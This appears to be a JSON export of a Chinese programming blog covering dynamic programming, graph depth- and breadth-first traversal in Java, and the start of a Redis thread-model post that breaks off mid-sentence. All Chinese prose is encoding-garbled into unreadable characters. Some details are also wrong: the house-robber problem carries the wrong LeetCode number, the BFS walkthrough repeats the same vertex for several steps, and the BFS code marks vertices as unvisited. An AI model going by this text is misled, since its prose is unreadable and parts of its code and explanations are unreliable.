åŠ¨æ€è§„åˆ’æ˜¯ç¼–ç¨‹çš„æ–¹æ³•æŒ‡ï¼Œå¯ä»¥å€ŸåŠ©ç¼–ç¨‹çš„æŠ€å·§å»ä¿è¯æ¯ä¸ªé‡å çš„å­é—®é¢˜åªä¼šè¢«æ±‚è§£ä¸€æ¬¡ã€‚ å› æ­¤ï¼Œåˆ¤æ–­ä¸€ä¸ªé—®é¢˜èƒ½ä¸èƒ½ç§°å¾—ä¸Šæ˜¯åŠ¨æ€è§„åˆ’çš„é—®é¢˜ï¼Œéœ€è¦çœ‹å®ƒæ˜¯æ»¡è¶³è¿™ä¸¤ä¸ªé‡è¦çš„å±æ€§ï¼šæœ€ä¼˜å­ç»“æ„ï¼ˆOptimal Substructureï¼‰å’Œé‡å å­é—®é¢˜ï¼ˆOverlapping Sub-problemsï¼‰ã€‚\nåŠ¨æ€è§„åˆ’æ–¹æ³•\r#\ré€’å½’ï¼ˆRecursionï¼‰\r#\ré€’å½’çš„è§£æ³•éœ€è¦è€—è´¹éå¸¸å¤šçš„é‡å¤è®¡ç®—ï¼Œå¾ˆå¤šè®¡ç®—éƒ½æ˜¯é‡å çš„ï¼Œå¯ä»¥ä½¿ç”¨è®°å¿†åŒ–çš„æ–¹æ³•é¿å…é‡å è®¡ç®—é—®é¢˜ã€‚\nè®°å¿†åŒ–ï¼ˆMemoizationï¼‰\r#\rè®°å¿†åŒ–ï¼Œå°±æ˜¯å°†å·²ç»è®¡ç®—å‡ºæ¥çš„ç»“æœä¿å­˜èµ·æ¥ï¼Œé‚£ä¹ˆä¸‹æ¬¡é‡åˆ°ç›¸åŒçš„è¾“å…¥æ—¶ï¼Œç›´æ¥è¿”å›ä¿å­˜å¥½çš„ç»“æœï¼Œèƒ½å¤Ÿæœ‰æ•ˆèŠ‚çœäº†å¤§é‡çš„è®¡ç®—æ—¶é—´ã€‚\nè‡ªåº•å‘ä¸Šï¼ˆBottom-Upï¼‰\r#\rè‡ªåº•å‘ä¸ŠæŒ‡ï¼Œé€šè¿‡çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼Œä»æœ€å°çš„é—®é¢˜è§„æ¨¡å…¥æ‰‹ï¼Œä¸æ–­åœ°å¢åŠ é—®é¢˜è§„æ¨¡ï¼Œç›´åˆ°æ‰€è¦æ±‚çš„é—®é¢˜è§„æ¨¡ä¸ºæ­¢ã€‚ä¾ç„¶ä½¿ç”¨è®°å¿†åŒ–é¿å…é‡å¤çš„è®¡ç®—ï¼Œä¸éœ€è¦é€’å½’ã€‚\næ–æ³¢é‚£å¥‘æ•°åˆ—\r#\rå†™ä¸€ä¸ªå‡½æ•°ï¼Œè¾“å…¥ n ï¼Œæ±‚æ–æ³¢é‚£å¥‘ï¼ˆFibonacciï¼‰æ•°åˆ—çš„ç¬¬ n é¡¹ã€‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„å®šä¹‰å¦‚ä¸‹ï¼š F(0) = 0,Â F(1)Â = 1 F(N) = F(N - 1) + F(N - 2), å…¶ä¸­ N \u0026gt; 1. Javaä»£ç \n// é€’å½’çš„å®ç° public int fib(int n) { if(n \u0026lt;= 1){ return n; }else{ return fib(n-1)+fib(n-2); } } // è®°å¿†åŒ–çš„å®ç° public int fib(int n) { // ç”¨äºè®°å¿†ä¸Šä¸€æ¬¡çš„ç»“æœ int[] fn = new int[n+1]; fn[0] = 0; fn[1] = 1; for (int i = 2; i \u0026lt;= n; i++) { fn[i] = fn[i-1] + fn[i-2]; } return fn[n]; } // è‡ªåº•å‘ä¸Šçš„å®ç° public int fib(int n) { if(n \u0026lt;= 1) { return n; } int f0 = 0, f1 = 1, res = 0; for(int i = 2; i \u0026lt;= n; i++) { res = f0 + f1; f0= f1; f1= res; } return res; } åŠ¨æ€è§„åˆ’é¢è¯•é¢˜åˆ†ç±»\r#\rçº¿æ€§è§„åˆ’\r#\rçº¿æ€§ï¼Œå°±æ˜¯è¯´å„ä¸ªå­é—®é¢˜çš„è§„æ¨¡ä»¥çº¿æ€§çš„æ–¹å¼åˆ†å¸ƒï¼Œå¹¶ä¸”å­é—®é¢˜çš„æœ€ä½³çŠ¶æ€æˆ–ç»“æœå¯ä»¥å­˜å‚¨åœ¨ä¸€ç»´çº¿æ€§çš„æ•°æ®ç»“æ„é‡Œï¼Œä¾‹å¦‚ä¸€ç»´æ•°ç»„ï¼Œå“ˆå¸Œè¡¨ç­‰ã€‚\nè§£æ³•ä¸­ï¼Œç»å¸¸ä¼šç”¨ dp[i] å»è¡¨ç¤ºç¬¬ i ä¸ªä½ç½®çš„ç»“æœï¼Œæˆ–è€…ä» 0 å¼€å§‹åˆ°ç¬¬ i ä¸ªä½ç½®ä¸ºæ­¢çš„æœ€ä½³çŠ¶æ€æˆ–ç»“æœã€‚ä¾‹å¦‚ï¼Œæœ€é•¿ä¸Šå‡å­åºåˆ—ã€‚dp[i] è¡¨ç¤ºä»æ•°ç»„ç¬¬ 0 ä¸ªå…ƒç´ å¼€å§‹åˆ°ç¬¬iä¸ªå…ƒç´ ä¸ºæ­¢çš„æœ€é•¿çš„ä¸Šå‡å­åºåˆ—ã€‚\nç¬¬ä¸€ç§å½¢å¼ï¼Œå½“å‰æ‰€æ±‚çš„å€¼ä»…ä»…ä¾èµ–äºæœ‰é™ä¸ªå…ˆå‰è®¡ç®—å¥½çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œdp[i] ä»…ä»…ä¾èµ–äºæœ‰é™ä¸ª dp[j]ï¼Œå…¶ä¸­ j \u0026lt; iã€‚\nLeetCode ç¬¬ 70 é¢˜ å‡è®¾ä½ æ­£åœ¨çˆ¬æ¥¼æ¢¯ã€‚éœ€è¦ n é˜¶ä½ æ‰èƒ½åˆ°è¾¾æ¥¼é¡¶ã€‚ æ¯æ¬¡ä½ å¯ä»¥çˆ¬ 1 æˆ– 2 ä¸ªå°é˜¶ã€‚ä½ æœ‰å¤šå°‘ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥çˆ¬åˆ°æ¥¼é¡¶å‘¢ï¼Ÿ æ³¨æ„ï¼šç»™å®š n æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ã€‚ å…¬å¼ï¼šf(x)=f(xâˆ’1)+f(xâˆ’2) class Solution { public int climbStairs(int n) { if(n \u0026lt;= 2) { return n; } int f1 = 1, f2 = 2, res = 0; for(int i = 3; i \u0026lt;= n; i++) { res = f1+f2; f1=f2; f2=res; } return res; } } LeetCodeç¬¬ 198 é¢˜ ç¬¬äºŒç§æ±‚è§£ dp[i] çš„å½¢å¼ï¼Œå½“å‰æ‰€æ±‚çš„å€¼ä¾èµ–äºæ‰€æœ‰å…ˆå‰è®¡ç®—å¥½çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œdp[i] æ˜¯å„ä¸ª dp[j] çš„æŸç§ç»„åˆï¼Œå…¶ä¸­ j ç”± 0 éå†åˆ° iâˆ’1ã€‚\nLeetCode ç¬¬ 516 é¢˜ ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„å°å·ï¼Œè®¡åˆ’å·çªƒæ²¿è¡—çš„æˆ¿å±‹ã€‚æ¯é—´æˆ¿å†…éƒ½è—æœ‰ä¸€å®šçš„ç°é‡‘ï¼Œå½±å“ä½ å·çªƒçš„å”¯ä¸€åˆ¶çº¦å› ç´ å°±æ˜¯ç›¸é‚»çš„æˆ¿å±‹è£…æœ‰ç›¸äº’è¿é€šçš„é˜²ç›—ç³»ç»Ÿï¼Œå¦‚æœä¸¤é—´ç›¸é‚»çš„æˆ¿å±‹åœ¨åŒä¸€æ™šä¸Šè¢«å°å·é—¯å…¥ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æŠ¥è­¦ã€‚ ç»™å®šä¸€ä¸ªä»£è¡¨æ¯ä¸ªæˆ¿å±‹å­˜æ”¾é‡‘é¢çš„éè´Ÿæ•´æ•°æ•°ç»„ï¼Œè®¡ç®—ä½  ä¸è§¦åŠ¨è­¦æŠ¥è£…ç½®çš„æƒ…å†µä¸‹ ï¼Œä¸€å¤œä¹‹å†…èƒ½å¤Ÿå·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ã€‚ ç¤ºä¾‹ ï¼š è¾“å…¥ï¼š[1,2,3,1] è¾“å‡ºï¼š4 è§£é‡Šï¼šå·çªƒ 1 å·æˆ¿å±‹ (é‡‘é¢ = 1) ï¼Œç„¶åå·çªƒ 3 å·æˆ¿å±‹ (é‡‘é¢ = 3)ã€‚ å·çªƒåˆ°çš„æœ€é«˜é‡‘é¢ = 1 + 3 = 4 ã€‚ åˆ†æï¼š S è¡¨ç¤ºå‰Sä¸ªæˆ¿å­èƒ½æ‹¿åˆ°çš„æœ€å¤§é‡‘é¢ã€‚ H è¡¨ç¤ºå½“å‰æˆ¿å­æœ‰å¤šå°‘é’±ã€‚ ç¬¬ä¸€é—´æˆ¿ï¼šs1 = h1 ç¬¬äºŒé—´æˆ¿ï¼šs2 = max(h1, h2) ç¬¬ä¸‰é—´æˆ¿ï¼šs3 = max(s1+h3, s2) ç¬¬å››é—´æˆ¿ï¼šs4 = max(s2+h4, s3) ç¬¬né—´æˆ¿ï¼šsn = max( s(n-2) +hn, s(n-1) )\nclass Solution { public int rob(int[] nums) { if (nums == null || nums.length == 0) { return 0; } int length = nums.length; if (length == 1) { return nums[0]; } int f0= nums[0], f1= Math.max(nums[0], nums[1]); for (int i = 2; i \u0026lt; length; i++) { int temp = f1; f1= Math.max(f0+ nums[i], f1); f0= temp; } return f1; } } çº¦æŸè§„åˆ’\r#\råœ¨æ™®é€šçš„çº¿æ€§è§„åˆ’å’ŒåŒºé—´è§„åˆ’é‡Œï¼Œä¸€èˆ¬é¢˜ç›®æœ‰ä¸¤ç§éœ€æ±‚ï¼šç»Ÿè®¡å’Œæœ€ä¼˜è§£ã€‚ è¿™äº›é¢˜ç›®ä¸ä¼šå¯¹è¾“å‡ºç»“æœä¸­çš„å…ƒç´ æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œåªè¦æ»¡è¶³æœ€ç»ˆçš„ä¸€ä¸ªæ¡ä»¶å°±å¥½äº†ã€‚ä½†æ˜¯åœ¨å¾ˆå¤šæƒ…å†µä¸‹ï¼Œé¢˜ç›®ä¼šå¯¹è¾“å‡ºç»“æœçš„å…ƒç´ æ·»åŠ ä¸€å®šçš„é™åˆ¶æˆ–çº¦æŸæ¡ä»¶ï¼Œå¢åŠ äº†è§£é¢˜çš„éš¾åº¦ã€‚\n0-1 èƒŒåŒ…é—®é¢˜ å…¬å¼ï¼š\nB(k, w) = max( B(k-1, w), B(k-1,w-wk) + Vk )\næ¯”è¾ƒæ˜¯æ”¾äº†ç¬¬kä¸ªç‰©å“åä»·å€¼å¤§è¿˜æ˜¯ä¸æ”¾ä»·å€¼å¤§ã€‚ kï¼šå‰kä¸ªç‰©å“ wï¼šè¿˜å‰©ä¸‹å¤šå°‘å®¹é‡ï¼Œwkç¬¬kä¸ªç‰©å“é‡é‡ vï¼šä»·å€¼ï¼ŒVkç¬¬kä¸ªç‰©å“ä»·å€¼ B(k-1, w)ï¼šæ˜¯ä¸æ”¾ç¬¬kä¸ªç‰©å“ B(k-1,w-wk) + Vkï¼šæ”¾äº†ç¬¬kä¸ªç‰©å“ /** * 01èƒŒåŒ…é—®é¢˜ * @param numOfItems å¤šå°‘ä¸ªå•†å“ * @param maxWeight èƒŒåŒ…çš„å®¹é‡ * @param values å•†å“çš„ä»·å€¼ * @param weights å•†å“çš„é‡é‡ * @return æœ€åœ¨ä»·å€¼ */ public int solution(int numOfItems, int maxWeight, int[] values, int[] weights) { int[][] tmp = new int[numOfItems+1][maxWeight+1]; for (int i = 1; i \u0026lt;= numOfItems ; i++) { int value = values[i-1]; int weight = weights[i-1]; for (int j = 1; j \u0026lt;= maxWeight; j++) { if (j \u0026gt;= weight) { tmp[i][j] = Math.max(tmp[i-1][j], tmp[i-1][j-weight] + value); } else { tmp[i][j] = tmp[i-1][j]; } } } return tmp[numOfItems][maxWeight]; } NP å®Œå…¨é—®é¢˜\r#\rè¯¥ä¾‹é¢˜ä¸º NP å®Œå…¨é—®é¢˜ã€‚NP æ˜¯ Non-deterministic Polynomial çš„ç¼©å†™ï¼Œä¸­æ–‡æ˜¯éæ±ºå®šæ€§å¤šé¡¹å¼ã€‚é€šä¿—ä¸€ç‚¹æ¥è¯´ï¼Œå¯¹äºè¿™ç±»é—®é¢˜ï¼Œæˆ‘ä»¬æ— æ³•åœ¨å¤šé¡¹å¼æ—¶é—´å†…è§£ç­”ã€‚è¿™ä¸ªæ¦‚å¿µå¾ˆéš¾ï¼Œä½†æ˜¯ç†è§£å¥½å®ƒèƒ½å¸®åŠ©ä½ å¾ˆå¥½çš„åˆ†ææ—¶é—´å¤æ‚åº¦ã€‚\nå¤šé¡¹å¼çº§åˆ«æ—¶é—´å¤æ‚åº¦ O(1)ã€O(n)ã€O(nÃ—logn)ã€O(n2)ã€O(n3) ç­‰ï¼Œå¯ä»¥è¡¨ç¤ºä¸º n çš„å¤šé¡¹å¼çš„ç»„åˆ\néå¤šé¡¹å¼çº§åˆ«æ—¶é—´å¤æ‚åº¦ O(2n)ï¼ŒO(3n) ç­‰æŒ‡æ•°çº§åˆ«å’Œ O(n!) ç­‰é˜¶ä¹˜çº§åˆ«\nEND!\n"},{"id":70,"href":"/posts/history/%E5%9B%BE%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E9%81%8D%E5%8E%86/","title":"å›¾æ·±åº¦ã€å¹¿åº¦ä¼˜å…ˆéå†","section":"æˆ‘çš„åšå®¢","content":"\rå›¾çš„ç§ç±»\r#\r1ã€æ— å‘å›¾ï¼ˆUndirected Graphï¼‰ï¼šæ¯ä¸ªé¡¶ç‚¹å’Œå…¶ä»–é¡¶ç‚¹é€šè¿‡ç›¸è¿çº¿è¿æ¥ã€‚ 2ã€æœ‰å‘å›¾(Drirected Graph)ï¼šæœ‰å‘å›¾ä¸­çš„ç›¸è¿çº¿æ˜¯æœ‰æ–¹å‘çš„ã€‚ 3ã€æƒé‡å›¾(Weighted Graph)ï¼šåœ¨æƒé‡å›¾ä¸­ï¼Œæ¯æ¡ç›¸è¿çº¿å„è‡ªæœ‰å„è‡ªçš„æƒé‡ã€‚\næœ‰å‘å›¾çš„å®ç°\r#\r1ã€çŸ©é˜µ\nä½¿ç”¨çŸ©é˜µæ¥è¡¨ç¤ºå›¾ä¹‹é—´çš„è¿å‘å…³ç³»ï¼Œç”¨ä¸€ä¸ªä¸€ç»´æ•°ç»„æ¥ä¿å­˜é¡¶ç‚¹ï¼Œå†äºŒç»´æ•°ç»„æ¥ä¿å­˜é¡¶ç‚¹ä¹‹é—´çš„å…³è”ã€‚å¦‚ï¼š\n1-\u0026gt;2æœ‰å…³è”ï¼Œå°±åœ¨edge[1][2]=1æ¥è¡¨ç¤ºã€‚\n2ã€é“¾è¡¨ ç”¨é“¾è¡¨æ¥è¡¨ç¤ºä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„å…³ç³»ï¼Œç”¨ä¸€ç»´æ•°ç»„æ¥ä¿å­˜å„ä¸ªé¡¶ç‚¹ï¼Œå†ä»¥é¡¶ç‚¹ä¸ºå¤´èŠ‚ç‚¹ï¼Œå…³è”è¾¹ç”¨é“¾è¡¨ä¸²èµ·æ¥ã€‚å¦‚ï¼š\n0-\u0026gt;1æœ‰å…³è”ï¼Œå°±ç”¨ä¸€æ¡é“¾è¡¨ä¿å­˜èµ·æ¥ã€‚\nDFSä¸BFSè¿‡ç¨‹\r#\ræ·±åº¦ä¼˜å…ˆç®—æ³•ä¸»è¦ä¸æ ˆæœ‰å…³ï¼ˆå…ˆè¿›åå‡ºï¼‰ï¼Œå¹¿åº¦ä¼˜å…ˆç®—æ³•ä¸å †æœ‰å…³ï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ã€‚\næ·±åº¦ä¼˜å…ˆç®—æ³•\r#\rè¿‡ç¨‹ï¼š\n1ã€å…ˆå°†0æ”¾åœ¨æ ˆä¸­ æ ˆä¸­æ•°æ®ï¼š0 æ‰“å°æ•°æ®ï¼š\n2ã€0å‡ºæ ˆå¹¶æ‰“å°ï¼ŒæŠŠ0ç›¸å…³è”çš„æ”¾å…¥æ ˆä¸­ï¼Œå³æŠŠ1ã€2æ”¾å…¥æ ˆä¸­ æ ˆä¸­æ•°æ®ï¼š1ã€2 æ‰“å°æ•°æ®ï¼š0\n3ã€1å‡ºæ ˆå¹¶æ‰“å°ï¼ŒæŠŠ1ç›¸å…³è”çš„æ”¾å…¥æ ˆä¸­ï¼Œå³æŠŠ3ã€4æ”¾å…¥æ ˆä¸­ æ ˆä¸­æ•°æ®ï¼š3ã€4ã€2 æ‰“å°æ•°æ®ï¼š0ã€1\n4ã€3å‡ºæ ˆå¹¶æ‰“å°ï¼Œ3æ²¡æœ‰ç›¸å…³è”çš„äº†ï¼Œå°±æ²¡æœ‰æ•°æ®å…¥æ ˆ æ ˆä¸­æ•°æ®ï¼š4ã€2 æ‰“å°æ•°æ®ï¼š0ã€1ã€3\n5ã€4å‡ºæ ˆå¹¶æ‰“å°ï¼Œ4æ²¡æœ‰ç›¸å…³è”çš„äº†ï¼Œå°±æ²¡æœ‰æ•°æ®å…¥æ ˆ æ ˆä¸­æ•°æ®ï¼š2 æ‰“å°æ•°æ®ï¼š0ã€1ã€3ã€4\n6ã€2å‡ºæ ˆå¹¶æ‰“å°ï¼ŒæŠŠ2ç›¸å…³è”çš„æ”¾å…¥æ ˆä¸­ï¼Œå³æŠŠ5ã€6æ”¾å…¥æ ˆä¸­ æ ˆä¸­æ•°æ®ï¼š5ã€6 æ‰“å°æ•°æ®ï¼š0ã€1ã€3ã€4ã€2\n7ã€5å‡ºæ ˆå¹¶æ‰“å°ï¼Œ5æ²¡æœ‰ç›¸å…³è”çš„äº†ï¼Œå°±æ²¡æœ‰æ•°æ®å…¥æ ˆ æ ˆä¸­æ•°æ®ï¼š6 æ‰“å°æ•°æ®ï¼š0ã€1ã€3ã€4ã€2ã€5\n8ã€6å‡ºæ ˆå¹¶æ‰“å°ï¼Œ6æ²¡æœ‰ç›¸å…³è”çš„äº†ï¼Œå°±æ²¡æœ‰æ•°æ®å…¥æ ˆ æ ˆä¸­æ•°æ®ï¼š æ‰“å°æ•°æ®ï¼š0ã€1ã€3ã€4ã€2ã€5ã€6\n9ï¼Œæ ˆä¸­æ²¡æœ‰æ•°æ®ï¼Œç»“æŸã€‚\nå¹¿åº¦ä¼˜å…ˆç®—æ³•\r#\rè¿‡ç¨‹ï¼š\n1ã€0æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š0 æ‰“å°æ•°æ®ï¼š\n2ã€0å‡ºå †å¹¶æ‰“å°ï¼ŒæŠŠä¸0ç›¸å…³è”çš„1ã€2æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š2ã€1 æ‰“å°æ•°æ®ï¼š0\n3ã€1å‡ºå †å¹¶æ‰“å°ï¼ŒæŠŠä¸1ç›¸å…³è”çš„3ã€4æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š4ã€3ã€2 æ‰“å°æ•°æ®ï¼š0ã€1\n4ã€2å‡ºå †å¹¶æ‰“å°ï¼ŒæŠŠä¸2ç›¸å…³è”çš„5ã€6æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š6ã€5ã€4ã€3 æ‰“å°æ•°æ®ï¼š0ã€1ã€2\n5ã€3å‡ºå †å¹¶æ‰“å°ï¼Œå› ä¸ºæ²¡æœ‰ç›¸å…³è”çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æ•°æ®æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š6ã€5ã€4 æ‰“å°æ•°æ®ï¼š0ã€1ã€2ã€3\n6ã€3å‡ºå †å¹¶æ‰“å°ï¼Œå› ä¸ºæ²¡æœ‰ç›¸å…³è”çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æ•°æ®æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š6ã€5 æ‰“å°æ•°æ®ï¼š0ã€1ã€2ã€3ã€4\n7ã€3å‡ºå †å¹¶æ‰“å°ï¼Œå› ä¸ºæ²¡æœ‰ç›¸å…³è”çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æ•°æ®æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š6 æ‰“å°æ•°æ®ï¼š0ã€1ã€2ã€3ã€4ã€5\n8ã€3å‡ºå †å¹¶æ‰“å°ï¼Œå› ä¸ºæ²¡æœ‰ç›¸å…³è”çš„ï¼Œæ‰€ä»¥æ²¡æœ‰æ•°æ®æ”¾å…¥å †ä¸­ å †ä¸­æ•°æ®ï¼š æ‰“å°æ•°æ®ï¼š0ã€1ã€2ã€3ã€4ã€5ã€6\n9ã€å †ä¸­æ²¡æœ‰æ•°æ®ï¼Œç»“æŸã€‚\nJavaä»£ç \r#\rå¯¹æœ‰å‘å›¾è¿›è¡Œæ·±åº¦ä¼˜å…ˆå’Œå¹¿åº¦ä¼˜å…ˆæœç´¢ã€‚\npublic class Graph { /** * é¡¶ç‚¹æ•°ç»„ */ Vertex[] vertexList; /** * ç”¨äºä¿å­˜é¡¶ç‚¹è¾¹ */ int[][] edges; /** * æœ€å¤§é¡¶ç‚¹ä¸ªæ•° */ int maxVertexNum; /** * é¡¶ç‚¹ä¸ªæ•° */ int vertexNum; /** * é¡¶ç‚¹ç±» */ class Vertex { /** * é¡¶ç‚¹æ ‡è¯† */ char label; /** * æ˜¯å¦å·²ç»è®¿é—®è¿‡ */ boolean wasVisited; public Vertex(char label) { this.label = label; wasVisited = false; } } public Graph(int maxVertexNum) { this.maxVertexNum = maxVertexNum; vertexNum = 0; vertexList = new Vertex[maxVertexNum]; edges = new int[maxVertexNum][maxVertexNum]; } /** * åŠ å…¥é¡¶ç‚¹ * @param label é¡¶ç‚¹æ ‡è¯† */ public void addVertex(char label) { if (vertexNum \u0026gt; maxVertexNum) { throw new IndexOutOfBoundsException(\u0026#34;åŠ å…¥å…ƒç´ æ¯”æœ€è¶…è¿‡æœ€å¤§å®¹é‡\u0026#34;); } vertexList[vertexNum++] = new Vertex(label); } /** * æ·»åŠ è¾¹ * @param from å¼€å§‹å…ƒç´  * @param to æŒ‡å‘å…ƒç´  */ public void addEdge(int from, int to) { edges[from][to] = 1; } /** * é‡ç½®é¡¶ç‚¹è¢«è®¿é—®æ ‡è¯† */ public void reset() { for (int i = 0; i \u0026lt; vertexList.length; i++) { vertexList[i].wasVisited = false; } } /** * æ‰“å°é¡¶ç‚¹ * @param vertex é¡¶ç‚¹ */ public void print(Vertex vertex) { System.out.print(vertex.label + \u0026#34; \u0026#34;); } /** * æ·±åº¦ä¼˜å…ˆç®—æ³• */ public void depthFirstSearch() { // æ”¾é¡¶ç‚¹æ•°ç»„ç´¢å¼• Stack\u0026lt;Integer\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); // æ·»åŠ é¦–èŠ‚ç‚¹ stack.add(0); while (!stack.isEmpty()) { // å‡ºæ ˆï¼Œæ‰“å°ï¼Œå¹¶è®¾ç½®å…ƒç´ è¢«è®¿é—®è¿‡ Integer pop = stack.pop(); print(vertexList[pop]); vertexList[pop].wasVisited = true; // æ·»åŠ ç›¸å…³è”èŠ‚ç‚¹ for (int i = 0; i \u0026lt; edges[pop].length; i++) { if (edges[pop][i] == 1 \u0026amp;\u0026amp; !vertexList[i].wasVisited) { stack.add(i); } } } reset(); } /** * å¹¿åº¦ä¼˜å…ˆç®—æ³• */ public void breadthFirstSearch() { // æ”¾é¡¶ç‚¹æ•°ç»„ç´¢å¼• Queue\u0026lt;Integer\u0026gt; queue = new LinkedList\u0026lt;\u0026gt;(); // æ·»åŠ é¦–èŠ‚ç‚¹ queue.offer(0); while (!queue.isEmpty()) { // å‡ºé˜Ÿåˆ—ï¼Œæ‰“å°ï¼Œå¹¶è®¾ç½®è¢«è®¿é—®è¿‡ Integer poll = queue.poll(); print(vertexList[poll]); vertexList[poll].wasVisited = false; // æ·»åŠ ç›¸å…³è”èŠ‚ç‚¹ for (int i = 0; i \u0026lt; edges[poll].length; i++) { if (edges[poll][i] == 1 \u0026amp;\u0026amp; !vertexList[i].wasVisited) { queue.add(i); } } } reset(); } /** * æµ‹è¯•å›¾ç¤ºä¾‹å¦‚ä¸‹ï¼š * ------------------- * | B -\u0026gt; C | * | ^ | * | | | * | A -\u0026gt; D -\u0026gt; E | * ------------------- */ public static void main(String[] args) { Graph graph = new Graph(5); graph.addVertex(\u0026#39;A\u0026#39;); graph.addVertex(\u0026#39;B\u0026#39;); graph.addVertex(\u0026#39;C\u0026#39;); graph.addVertex(\u0026#39;D\u0026#39;); graph.addVertex(\u0026#39;E\u0026#39;); graph.addEdge(0,1);//AB graph.addEdge(1,2);//BC graph.addEdge(0,3);//AD graph.addEdge(3,4);//DE System.out.println(\u0026#34;æ·±åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ï¼š\u0026#34;); graph.depthFirstSearch(); System.out.println(); System.out.println(\u0026#34;---------------\u0026#34;); System.out.println(\u0026#34;å¹¿åº¦ä¼˜å…ˆæœç´¢ç®—æ³•ï¼š\u0026#34;); graph.breadthFirstSearch(); } } END!\n"},{"id":71,"href":"/posts/history/redis/","title":"Redis","section":"æˆ‘çš„åšå®¢","content":"\rRedisçš„çº¿ç¨‹æ¨¡å‹\r#\rå®¢æˆ·ç«¯ socket01 å‘ redis çš„ server socket è¯·æ±‚å»ºç«‹è¿æ¥ï¼Œæ­¤æ—¶ server socket ä¼šäº§ç”Ÿä¸€ä¸ª AE_READABLE äº‹ä»¶ï¼ŒIO å¤šè·¯å¤ç”¨ç¨‹åºç›‘å¬åˆ° server socket äº§ç”Ÿçš„äº‹ä»¶åï¼Œå°†è¯¥äº‹ä»¶å‹å…¥é˜Ÿåˆ—ä¸­ã€‚æ–‡ä»¶äº‹ä»¶åˆ†æ´¾å™¨ä»é˜Ÿåˆ—ä¸­è·å–è¯¥äº‹ä»¶ï¼Œäº¤ç»™è¿æ¥åº”ç­”å¤„ç†å™¨ã€‚è¿æ¥åº”ç­”å¤„ç†å™¨ä¼šåˆ›å»ºä¸€ä¸ªèƒ½ä¸å®¢æˆ·ç«¯é€šä¿¡çš„ socket01ï¼Œå¹¶å°†è¯¥ socket01 çš„ AE_READABLE äº‹ä»¶ä¸å‘½ä»¤è¯·æ±‚å¤„ç†å™¨å…³è”ã€‚\nå‡è®¾æ­¤æ—¶å®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ª set key value è¯·æ±‚ï¼Œæ­¤æ—¶ redis ä¸­çš„ socket01 ä¼šäº§ç”Ÿ AE_READABLE äº‹ä»¶ï¼ŒIO å¤šè·¯å¤ç”¨ç¨‹åºå°†äº‹ä»¶å‹å…¥é˜Ÿåˆ—ï¼Œæ­¤æ—¶äº‹ä»¶åˆ†æ´¾å™¨ä»é˜Ÿåˆ—ä¸­è·å–åˆ°è¯¥äº‹ä»¶ï¼Œç”±äºå‰é¢ socket01 çš„ AE_READABLE äº‹ä»¶å·²ç»ä¸å‘½ä»¤è¯·æ±‚å¤„ç†å™¨å…³è”ï¼Œå› æ­¤äº‹ä»¶åˆ†æ´¾å™¨å°†äº‹ä»¶äº¤ç»™å‘½ä»¤è¯·æ±‚å¤„ç†å™¨æ¥å¤„ç†ã€‚å‘½ä»¤è¯·æ±‚å¤„ç†å™¨è¯»å– socket01 çš„ key value å¹¶åœ¨è‡ªå·±å†…å­˜ä¸­å®Œæˆ key value çš„è®¾ç½®ã€‚æ“ä½œå®Œæˆåï¼Œå®ƒä¼šå°† socket01 çš„ AE_WRITABLE äº‹ä»¶ä¸ä»¤å›å¤å¤„ç†å™¨å…³è”ã€‚\nå¦‚æœæ­¤æ—¶å®¢æˆ·ç«¯å‡†å¤‡å¥½æ¥æ”¶è¿”å›ç»“æœäº†ï¼Œé‚£ä¹ˆ redis ä¸­çš„ socket01 ä¼šäº§ç”Ÿä¸€ä¸ª AE_WRITABLE äº‹ä»¶ï¼ŒåŒæ ·å‹å…¥é˜Ÿåˆ—ä¸­ï¼Œäº‹ä»¶åˆ†æ´¾å™¨æ‰¾åˆ°ç›¸å…³è”çš„å‘½ä»¤å›å¤å¤„ç†å™¨ï¼Œç”±å‘½ä»¤å›å¤å¤„ç†å™¨å¯¹ socket01 è¾“å…¥æœ¬æ¬¡æ“ä½œçš„ä¸€ä¸ªç»“æœï¼Œæ¯”å¦‚ okï¼Œä¹‹åè§£é™¤ socket01 çš„ AE_WRITABLE äº‹ä»¶ä¸å‘½ä»¤å›å¤å¤„ç†å™¨çš„å…³è”ã€‚\nrediså•çº¿ç¨‹æ¨¡å‹æ•ˆç‡é«˜\r#\rå¯¹redisé‡Œçš„æ•°æ®æ“ä½œçš„æ—¶å€™æ˜¯çº¯å†…å­˜æ“ä½œã€‚ æ–‡ä»¶äº‹ä»¶å¤„ç†å™¨çš„æ ¸å¿ƒæœºåˆ¶æ˜¯éé˜»å¡çš„IOå¤šè·¯å¤ç”¨ç¨‹åºã€‚ å•çº¿ç¨‹é¿å…äº†å¤šçº¿ç¨‹é¢‘ç¹ä¸Šä¸‹æ–‡åˆ‡æ¢å¸¦æ¥çš„æŸè€—ã€‚ redisçš„è¿‡æœŸç­–ç•¥å’Œå†…å­˜æ·˜æ±°æœºåˆ¶\r#\rå®šæœŸåˆ é™¤ å®šæœŸåˆ 